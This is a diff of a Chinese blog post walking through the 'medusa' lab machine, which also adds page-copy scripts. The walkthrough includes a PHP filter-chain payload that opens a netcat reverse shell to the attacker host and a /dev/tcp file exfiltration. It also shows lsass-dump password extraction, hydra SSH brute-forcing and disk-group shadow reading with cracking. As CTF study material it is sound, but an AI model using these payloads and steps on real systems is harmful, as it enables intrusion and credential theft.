nvert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&amp;0=nc%20192.168.205.128%208888%20-e%20/bin/bash
 ┌──(kali㉿kali)-[~/test]
 └─$ nc -lvnp 8888                                
 listening on [any] 8888 ...
@@ -473,17 +483,16 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 </code></pre>
 <h1>3. 获得稳定的 Shell</h1>
 <p>获取反向 shell 后，通过以下命令获得稳定的交互式 TTY shell：</p>
-<pre lang="bash"><code>script /dev/null -c bash  
+<div class="highlight highlight-source-shell"><pre class="notranslate">script /dev/null -c bash  
 ctrl+z  
-stty raw -echo; fg  
+stty raw -echo<span class="pl-k">;</span> <span class="pl-c1">fg</span>  
 reset xterm  
-export TERM=xterm  
-echo $SHELL  
-export SHELL=/bin/bash  
-stty rows 59 cols 236
-</code></pre>
+<span class="pl-k">export</span> TERM=xterm  
+<span class="pl-c1">echo</span> <span class="pl-smi">$SHELL</span>  
+<span class="pl-k">export</span> SHELL=/bin/bash  
+stty rows 59 cols 236</pre></div>
 <h1>4.提权</h1>
-<pre><code>www-data@medusa:/var/www/dev/files$ ls -la
+<pre class="notranslate"><code class="notranslate">www-data@medusa:/var/www/dev/files$ ls -la
 total 16
 drwxr-xr-x 2 root root 4096 Jan 19  2023 .
 drwxr-xr-x 5 root root 4096 Jan 19  2023 ..
@@ -630,7 +639,7 @@ drwxr-xr-x 19 root     root         4096 Jan 15  2023 ..
 -rw-------  1 www-data www-data 12387024 Jan 18  2023 old_files.zip
 </code></pre>
 <p>拷过去看看有啥</p>
-<pre><code>www-data@medusa:/...$ cat old_files.zip &gt; /dev/tcp/192.168.205.128/7777
+<pre class="notranslate"><code class="notranslate">www-data@medusa:/...$ cat old_files.zip &gt; /dev/tcp/192.168.205.128/7777
 
 #kali
 ┌──(kali㉿kali)-[~/test]
@@ -669,7 +678,7 @@ Sub items Errors: 1
 Break signaled
 </code></pre>
 <p>爆破一下</p>
-<pre><code>┌──(kali㉿kali)-[~/test]
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ zip2john old_files.zip &gt; hash                       
                                                                                                                                      
 ┌──(kali㉿kali)-[~/test]
@@ -722,8 +731,8 @@ Compressed: 12387024
 └─$ file lsass.DMP
 lsass.DMP: Mini DuMP crash report, 12 streams, Tue Jan 17 14:08:32 2023, 0x1826 type
 </code></pre>
-<p>参考链接：<a href="https://technicalnavigator.in/how-to-extract-information-from-dmp-files/">https://technicalnavigator.in/how-to-extract-information-from-dmp-files/</a></p>
-<pre><code>┌──(kali㉿kali)-[~/test]
+<p>参考链接：<a href="https://technicalnavigator.in/how-to-extract-information-from-dmp-files/" rel="nofollow">https://technicalnavigator.in/how-to-extract-information-from-dmp-files/</a></p>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ pypykatz lsa minidump lsass.DMP                
 INFO:pypykatz:Parsing file lsass.DMP
 FILE: ======== lsass.DMP =======
@@ -743,8 +752,8 @@ luid 2261421
                    
 </code></pre>
 <p>提取一下</p>
-<pre><code>┌──(kali㉿kali)-[~/test]
-└─$ pypykatz lsa minidump lsass.DMP | grep &quot;username&quot;
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ pypykatz lsa minidump lsass.DMP | grep "username"
 
 INFO:pypykatz:Parsing file lsass.DMP
 username avijneyam
@@ -835,7 +844,7 @@ username MEDUSA-PC$
                                                                                         
 
 ┌──(kali㉿kali)-[~/test]
-└─$ pypykatz lsa minidump lsass.DMP | grep &quot;username&quot;|awk -F ' ' '{print $2}'|sort | uniq
+└─$ pypykatz lsa minidump lsass.DMP | grep "username"|awk -F ' ' '{print $2}'|sort | uniq
 INFO:pypykatz:Parsing file lsass.DMP
 
 alienum
@@ -861,7 +870,7 @@ sml
 spectre
                
 ┌──(kali㉿kali)-[~/test]
-└─$ pypykatz lsa minidump lsass.DMP | grep &quot;password&quot; 
+└─$ pypykatz lsa minidump lsass.DMP | grep "password" 
 INFO:pypykatz:Parsing file lsass.DMP
                 password 4v1jn3y4m_zxc
                 password (hex)3400760031006a006e003300790034006d005f007a0078006300000000000000
@@ -1007,7 +1016,7 @@ INFO:pypykatz:Parsing file lsass.DMP
                                                                
 
 ┌──(kali㉿kali)-[~/test]
-└─$ pypykatz lsa minidump lsass.DMP | grep &quot;password&quot;|awk '!/hex/'|awk -F ' ' '{print $2}'| sort | uniq
+└─$ pypykatz lsa minidump lsass.DMP | grep "password"|awk '!/hex/'|awk -F ' ' '{print $2}'| sort | uniq
 INFO:pypykatz:Parsing file lsass.DMP
 123456
 4l13num_qwerty
@@ -1030,7 +1039,7 @@ UnD3sc0n0c1d0
 Wh1t3_h4ck
 </code></pre>
 <p>汇总一下</p>
-<pre><code>┌──(kali㉿kali)-[~/test]
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ cat user
 alienum
 ANONYMOUS
@@ -1078,7 +1087,7 @@ Wh1t3_h4ck
           
 </code></pre>
 <p>但是我们用户刚刚看只有spectre，所以我们先尝试爆破spectre先</p>
-<pre><code>┌──(kali㉿kali)-[~/test]
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ hydra -l spectre -P pass ssh://192.168.205.145 -V -I -u -f -e nsr -t 64
 
 Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
@@ -1088,36 +1097,36 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-04 18:33:
 [WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
 [DATA] max 22 tasks per 1 server, overall 22 tasks, 22 login tries (l:1/p:22), ~1 try per task
 [DATA] attacking ssh://192.168.205.145:22/
-[ATTEMPT] target 192.168.205.145 - login &quot;spectre&quot; - pass &quot;spectre&quot; - 1 of 22 [child 0] (0/0)
-[ATTEMPT] target 192.168.205.145 - login &quot;spectre&quot; - pass &quot;&quot; - 2 of 22 [child 1] (0/0)
-[ATTEMPT] target 192.168.205.145 - login &quot;spectre&quot; - pass &quot;ertceps&quot; - 3 of 22 [child 2] (0/0)
-[ATTEMPT] target 192.168.205.145 - login &quot;spectre&quot; - pass &quot;123456&quot; - 4 of 22 [child 3] (0/0)
-[ATTEMPT] target 192.168.205.145 - login &quot;spectre&quot; - pass &quot;4l13num_qwerty&quot; - 5 of 22 [child 4] (0/0)
-[ATTEMPT] target 192.168.205.145 - login &quot;spectre&quot; - pass &quot;4v1jn3y4m_zxc&quot; - 6 of 22 [child 5] (0/0)
-[ATTEMPT] target 192.168.205.145 - login &quot;spectre&quot; - pass &quot;5p3ctr3_p0is0n_xX&quot; - 7 of 22 [child 6] (0/0)
-[ATTEMPT] target 192.168.205.145 - login &quot;spectre&quot; - pass &quot;b1zum_3_AM&quot; - 8 of 22 [child 7] (0/0)
-[ATTEMPT] target 192.168.205.145 - login &quot;spectre&quot; - pass &quot;b4ck3nd_pr0gr4m3r&quot; - 9 of 22 [child 8] (0/0)
-[ATTEMPT] target 192.168.205.145 - login &quot;spectre&quot; - pass &quot;br4in_br34k3r&quot; - 10 of 22 [child 9] (0/0)
-[ATTEMPT] target 192.168.205.145 - login &quot;spectre&quot; - pass &quot;br4in_br34k3r_v2&quot; - 11 of 22 [child 10] (0/0)
-[ATTEMPT] target 192.168.205.145 - login &quot;spectre&quot; - pass &quot;littl3_h4ck3r&quot; - 12 of 22 [child 11] (0/0)
-[ATTEMPT] target 192.168.205.145 - login &quot;spectre&quot; - pass &quot;littl3_h4ck3r_v2&quot; - 13 of 22 [child 12] (0/0)
-[ATTEMPT] target 192.168.205.145 - login &quot;spectre&quot; - pass &quot;n0s_v0lv1m0s_4_1lusi0n4r&quot; - 14 of 22 [child 13] (0/0)
-[ATTEMPT] target 192.168.205.145 - login &quot;spectre&quot; - pass &quot;n1mb3r_s1x&quot; - 15 of 22 [child 14] (0/0)
-[ATTEMPT] target 192.168.205.145 - login &quot;spectre&quot; - pass &quot;None&quot; - 16 of 22 [child 15] (0/0)
-[ATTEMPT] target 192.168.205.145 - login &quot;spectre&quot; - pass &quot;p0w3rf1ll_abc&quot; - 17 of 22 [child 16] (0/0)
-[ATTEMPT] target 192.168.205.145 - login &quot;spectre&quot; - pass &quot;pr0xy_ch41ns_456&quot; - 18 of 22 [child 17] (0/0)
-[ATTEMPT] target 192.168.205.145 - login &quot;spectre&quot; - pass &quot;t0p_s3cr3t&quot; - 19 of 22 [child 18] (0/0)
-[ATTEMPT] target 192.168.205.145 - login &quot;spectre&quot; - pass &quot;th3_b0ss&quot; - 20 of 22 [child 19] (0/0)
-[ATTEMPT] target 192.168.205.145 - login &quot;spectre&quot; - pass &quot;UnD3sc0n0c1d0&quot; - 21 of 22 [child 20] (0/0)
-[ATTEMPT] target 192.168.205.145 - login &quot;spectre&quot; - pass &quot;Wh1t3_h4ck&quot; - 22 of 22 [child 21] (0/0)
-[REDO-ATTEMPT] target 192.168.205.145 - login &quot;spectre&quot; - pass &quot;br4in_br34k3r_v2&quot; - 23 of 27 [child 1] (1/5)
+[ATTEMPT] target 192.168.205.145 - login "spectre" - pass "spectre" - 1 of 22 [child 0] (0/0)
+[ATTEMPT] target 192.168.205.145 - login "spectre" - pass "" - 2 of 22 [child 1] (0/0)
+[ATTEMPT] target 192.168.205.145 - login "spectre" - pass "ertceps" - 3 of 22 [child 2] (0/0)
+[ATTEMPT] target 192.168.205.145 - login "spectre" - pass "123456" - 4 of 22 [child 3] (0/0)
+[ATTEMPT] target 192.168.205.145 - login "spectre" - pass "4l13num_qwerty" - 5 of 22 [child 4] (0/0)
+[ATTEMPT] target 192.168.205.145 - login "spectre" - pass "4v1jn3y4m_zxc" - 6 of 22 [child 5] (0/0)
+[ATTEMPT] target 192.168.205.145 - login "spectre" - pass "5p3ctr3_p0is0n_xX" - 7 of 22 [child 6] (0/0)
+[ATTEMPT] target 192.168.205.145 - login "spectre" - pass "b1zum_3_AM" - 8 of 22 [child 7] (0/0)
+[ATTEMPT] target 192.168.205.145 - login "spectre" - pass "b4ck3nd_pr0gr4m3r" - 9 of 22 [child 8] (0/0)
+[ATTEMPT] target 192.168.205.145 - login "spectre" - pass "br4in_br34k3r" - 10 of 22 [child 9] (0/0)
+[ATTEMPT] target 192.168.205.145 - login "spectre" - pass "br4in_br34k3r_v2" - 11 of 22 [child 10] (0/0)
+[ATTEMPT] target 192.168.205.145 - login "spectre" - pass "littl3_h4ck3r" - 12 of 22 [child 11] (0/0)
+[ATTEMPT] target 192.168.205.145 - login "spectre" - pass "littl3_h4ck3r_v2" - 13 of 22 [child 12] (0/0)
+[ATTEMPT] target 192.168.205.145 - login "spectre" - pass "n0s_v0lv1m0s_4_1lusi0n4r" - 14 of 22 [child 13] (0/0)
+[ATTEMPT] target 192.168.205.145 - login "spectre" - pass "n1mb3r_s1x" - 15 of 22 [child 14] (0/0)
+[ATTEMPT] target 192.168.205.145 - login "spectre" - pass "None" - 16 of 22 [child 15] (0/0)
+[ATTEMPT] target 192.168.205.145 - login "spectre" - pass "p0w3rf1ll_abc" - 17 of 22 [child 16] (0/0)
+[ATTEMPT] target 192.168.205.145 - login "spectre" - pass "pr0xy_ch41ns_456" - 18 of 22 [child 17] (0/0)
+[ATTEMPT] target 192.168.205.145 - login "spectre" - pass "t0p_s3cr3t" - 19 of 22 [child 18] (0/0)
+[ATTEMPT] target 192.168.205.145 - login "spectre" - pass "th3_b0ss" - 20 of 22 [child 19] (0/0)
+[ATTEMPT] target 192.168.205.145 - login "spectre" - pass "UnD3sc0n0c1d0" - 21 of 22 [child 20] (0/0)
+[ATTEMPT] target 192.168.205.145 - login "spectre" - pass "Wh1t3_h4ck" - 22 of 22 [child 21] (0/0)
+[REDO-ATTEMPT] target 192.168.205.145 - login "spectre" - pass "br4in_br34k3r_v2" - 23 of 27 [child 1] (1/5)
 [22][ssh] host: 192.168.205.145   login: spectre   password: 5p3ctr3_p0is0n_xX
 [STATUS] attack finished for 192.168.205.145 (valid pair found)
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-04 18:33:20
 </code></pre>
 <p>登录</p>
-<pre><code>www-data@medusa:/...$ ls /home/
+<pre class="notranslate"><code class="notranslate">www-data@medusa:/...$ ls /home/
 spectre
 www-data@medusa:/...$ su - spectre
 Password: 
@@ -1125,8 +1134,8 @@ spectre@medusa:~$ id
 uid=1000(spectre) gid=1000(spectre) groups=1000(spectre),6(disk),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
 </code></pre>
 <p>disk我记得好像可以提权</p>
-<p><a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#disk-group">https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#disk-group</a></p>
-<pre><code>#查看系统分区和文件系统信息
+<p><a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#disk-group" rel="nofollow">https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#disk-group</a></p>
+<pre class="notranslate"><code class="notranslate">#查看系统分区和文件系统信息
 df -h
 #使用debugfs查看文件
 debugfs /dev/sda1
@@ -1178,7 +1187,7 @@ systemd-coredump:!*:19372::::::
 ftp:*:19372:0:99999:7:::
 </code></pre>
 <p>拿去爆破</p>
-<pre><code>┌──(kali㉿kali)-[~/test]
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ echo 'root:$y$j9T$AjVXCCcjJ6jTodR8BwlPf.$4NeBwxOq4X0/0nCh3nrIBmwEEHJ6/kDU45031VFCWc2:19375:0:99999:7:::' &gt; hash
                                                                                                                                    
 ┌──(kali㉿kali)-[~/test]
@@ -1196,13 +1205,13 @@ Will run 12 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
 andromeda        (root)   
 1g 0:00:00:06 DONE (2025-02-04 18:39) 0.1455g/s 544.9p/s 544.9c/s 544.9C/s 19871987..street
-Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
                  
 </code></pre>
 <p>登录</p>
-<pre><code>debugfs:  exit
-debugfs: Unknown request &quot;exit&quot;.  Type &quot;?&quot; for a request list.
+<pre class="notranslate"><code class="notranslate">debugfs:  exit
+debugfs: Unknown request "exit".  Type "?" for a request list.
 debugfs:  
 debugfs:  quit
 spectre@medusa:~$ su -
@@ -1210,7 +1219,6 @@ Password:
 root@medusa:~# id
 uid=0(root) gid=0(root) groups=0(root)
 </code></pre>
-<!-- raw HTML omitted -->
 </div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
@@ -1236,7 +1244,7 @@ if(""!=""){
 </script></div>
 </body>
 <script>
-var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z'};
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
 var utterancesLoad=0;
 
 console.log("\n %c Gmeek main https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
@@ -1283,7 +1291,70 @@ function iFrameLoading(){
     }
 }
 
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
 
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
 
 </script>
 </script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>
